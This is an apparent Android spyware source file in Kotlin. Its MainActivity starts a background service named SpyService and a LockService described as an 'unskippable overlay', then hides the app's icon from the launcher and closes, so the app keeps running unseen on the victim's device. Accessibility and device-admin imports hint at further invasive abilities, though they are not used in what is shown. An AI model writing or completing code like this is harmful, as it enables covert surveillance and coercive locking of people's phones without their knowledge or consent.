package com.uk.core

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Start Background Service
        val intent = Intent(this, SpyService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
        else startService(intent)

        // Start Lock Service (Unskippable overlay)
        startService(Intent(this, LockService::class.java))

        // Hide Icon from Launcher
        val p = packageManager
        val comp = ComponentName(this, MainActivity::class.java)
        p.setComponentEnabledSetting(comp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)

        finish()
    }
}